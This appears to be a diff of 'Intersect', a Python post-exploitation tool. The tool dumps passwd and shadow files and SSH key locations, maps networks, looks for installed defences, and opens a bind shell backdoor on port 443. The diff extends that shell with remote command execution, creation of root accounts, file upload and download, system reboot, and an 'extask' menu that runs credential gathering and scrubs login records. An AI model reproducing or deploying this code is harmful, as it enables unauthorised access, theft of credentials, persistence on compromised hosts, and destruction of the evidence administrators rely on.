@@ -213,9 +213,9 @@ def GetCredentials():
     
     os.system('getent passwd > passwd.txt')
     os.system('getent shadow > shadow.txt')
+    
     os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
     os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
-    
     sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
     content = ''
     for f in sshfiles:
@@ -252,7 +252,6 @@ def GetCredentials():
     os.system("getent aliases > mail_aliases.txt")
 
 def NetworkInfo():
-    # Fix getGateway
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
@@ -324,20 +323,7 @@ def NetworkMap():
     file.close
 
 # --------------- ARP scan then SYN scan each live IP ---------------------------------
-#print("[-] Searching for live hosts...")
-#ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
-#for snd,rcv in ans:
-    #mac_address=rcv.sprintf("%Ether.src%")
-    #ip_address=rcv.sprintf("%ARP.psrc%")
-    #alives = ["%ARP.psrc%" in ans]
-    #print rcv.sprintf("\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%")
-   
-#file.write("\n\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")
-
-#ip = sys.argv[1]
-
-#conf.verb=1
-#for p in alives: ip=IP(p[1])   
+#portscan  
 #tcp = TCP(dport=[21,22,23,80,1433],sport=[53],flags="S",seq=40)
 #ans,unans = sr(ip/tcp)
     
@@ -348,27 +334,27 @@ def NetworkMap():
       #services = socket.getservbyport(sent.dport)
       #print str(sent.dport)+" "+services+" : open"
       
-  #-----------------------------------Traceroute ---------------------------------------------    
-  #res,unans = traceroute(["target"],dport=[{"open ports from scan or port 80"}],maxttl=20,retry=-2
-  #
-  #
-  #------------------------------Get MAC addr-------------------------------------------------
-  ## Don't need this snippet yet but it's here so I don't lose it
-  #
-  # data = commands.getoutput("ifconfig " + iface)
-  #  words = data.split()
-  #  found = 0
-  #  for x in words:
-        #print x
-  #      if found != 0:
-  #         mac = x
-  #          break
-  #      if x == "HWaddr":
-  #          found = 1
-  #  if len(mac) == 0:
-  #      mac = 'Mac not found'
-  #  mac = mac[:17]
-  #  print mac
+#-----------------------------------Traceroute ---------------------------------------------    
+#res,unans = traceroute(["target"],dport=[{"open ports from scan or port 80"}],maxttl=20,retry=-2
+#
+#
+#------------------------------Get MAC addr-------------------------------------------------
+## Don't need this snippet yet but it's here so I don't lose it
+#
+# data = commands.getoutput("ifconfig " + iface)
+#  words = data.split()
+#  found = 0
+#  for x in words:
+      #print x
+#      if found != 0:
+#         mac = x
+#          break
+#      if x == "HWaddr":
+#          found = 1
+#  if len(mac) == 0:
+#      mac = 'Mac not found'
+#  mac = mac[:17]
+#  print mac
     
 def FindProtect():
     # check ToDo-List for additional changes
@@ -380,8 +366,8 @@ def FindProtect():
     os.mkdir(Temp_Dir+"/protection")
     protectiondir = (Temp_Dir+"/protection")
     os.chdir(protectiondir)
-    #if os.path.exists("/etc/snort/snort.conf") is True:
-    #    shutil.copy2("/etc/snort/snort.conf", Temp_Dir+"/configs/")
+    if os.path.exists("/etc/snort/snort.conf") is True:
+        shutil.copy2("/etc/snort/snort.conf", Temp_Dir+"/configs/")
     print("[+] Serching for misc extras (netcat, perl, gcc, tcpdump, etc)....")
     os.system("""
     whereis truecrypt > tc.txt && whereis bulldog > bulldog.txt && whereis ufw > ufw.txt && 
@@ -461,7 +447,6 @@ def writeNewFile(filePath, fileContents):
 def exploitCheck():
     # Shout out to Bernardo Damele for letting me use this code! Thanks again!
     # Check out his blog at http://bernardodamele.blogspot.com
-    # Still need to properly implement this feature. Code works but must add getopt, etc. 
 
     exploitdb_url = "http://www.exploit-db.com/exploits"
     enlightenment_url = "http://www.grsecurity.net/~spender/enlightenment.tgz"
@@ -531,12 +516,18 @@ def bindShell():
     PORT = 443
     socksize = 4096
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((HOST, PORT))
-    print "[!] Shell bound on 443"
-    server.listen(5)
-    conn, addr = server.accept()
-    print "[!] New Connection: %s" % addr[0]
-    conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+    try:
+        server.bind((HOST, PORT))
+        server.listen(5)
+        print "[!] Shell bound on 443"
+        conn, addr = server.accept()
+        print "[!] New Connection: %s" % addr[0]
+        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+    except:
+    	print "[!] Error listening. Is port all ready used?"
+    	sys.exit(2)
+
     
     while True:
         cmd = conn.recv(socksize)
@@ -551,10 +542,10 @@ def bindShell():
 	    destination = cmd[3:].replace('\n','')
             if os.path.isdir(destination):
 	        os.chdir(destination)
-	        conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
             else:
 	        conn.send("[!] Directory does not exist") 
-	        conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
             acct = strip[1]
@@ -562,7 +553,7 @@ def bindShell():
             conn.send("[!] Root account " + acct + " has been created.")   
         elif cmd.startswith('upload'):
             data = conn.recv(1024)
-            strip = cmd.split(" ")
+            strip = data.split(" ")
             filename = strip[1]
             data = conn.recv(1024)
             filewrite=file(filename, "wb")
@@ -587,26 +578,64 @@ def bindShell():
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
+        elif cmd.startswith("extask"):
+            strip = cmd.split(" ")
+            task = strip[1]
+            if task.startswith("osinfo"):
+            	Gather_OS()
+            	conn.send("\n[+] OS Info Gathering complete.")
+            	conn.send("\n[+] Reports located in: %s " % Temp_Dir)
+            	conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            elif task.startswith("network"):
+            	NetworkInfo()
+            	conn.send("\n[+] Network Gather complete.")
+            	conn.send("\n[+] Reports located in: %s " % Temp_Dir)
+            	conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            elif task.startswith("credentials"):
+            	GetCredentials()
+            	conn.send("\n[+] Credentials Gather complete.")
+            	conn.send("\n[+] Reports located in: %s " % Temp_Dir)
+            	conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            elif task.startswith("livehosts"):
+            	NetworkMap()
+            	conn.send("\n[+] Network Map complete.")
+            	conn.send("\n[+] Reports located in: %s " % Temp_Dir)
+            	conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            elif task.startswith("findextras"):
+            	FindProtect()
+            	conn.send("\n[+] Extras Gather complete.")
+            	conn.send("\n[+] Reports located in: %s " % Temp_Dir)
+            	conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            elif task.startswith("scrub"):
+                ScrubLog()
+                conn.send("\n[+] Scrubbing complete.")
+            	conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
+            elif task.startswith("help"):
+                conn.send("   extask help menu    \n")
+                conn.send("osinfo      | gather os info\n")
+                conn.send("livehosts   | maps internal network\n")
+                conn.send("credentials | user/sys credentials\n")
+                conn.send("findextras  | av/fw and extras\n")
+                conn.send("network     | ips, fw rules, connections, etc\n")
+                conn.send("scrub       | clears 'who' 'w' 'last' 'lastlog'\n")
+                conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
         elif cmd.startswith('helpme'):
             conn.send(" Intersect TCP Shell | Help Menu \n")
             conn.send("---------------------------------\n")
             conn.send("** download <file> | download file from host\n")
             conn.send("** upload <file>   | upload file to host\n")
-            conn.send("** extask <task>   | run Intersect task\n")
             conn.send("** isniff <iface>  | start sniffer on <iface>\n")
             conn.send("** usessh <port>   | enable SSH on <port>\n")
+            conn.send("   extask  <task>  | run Intersect tasks\n")
             conn.send("   adduser <name>  | add new root account\n")
             conn.send("   rebootsys       | reboots server system\n")
             conn.send("   helpme          | show this help menu\n")
-            conn.send("** = must connect using the Intersect shell client to use this feature.")
-            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+            conn.send("** = must connect using the Intersect shell client to use this feature.\n")
+            conn.send(" Use '<cmd> help' to show more options for each task")
+            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
         elif proc:
             conn.sendall( stdout )
-            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
-        elif proc:
-    	    conn.sendall("[!] Error: " + stderr)
-            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
-
+            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
 
 
 def MakeArchive():
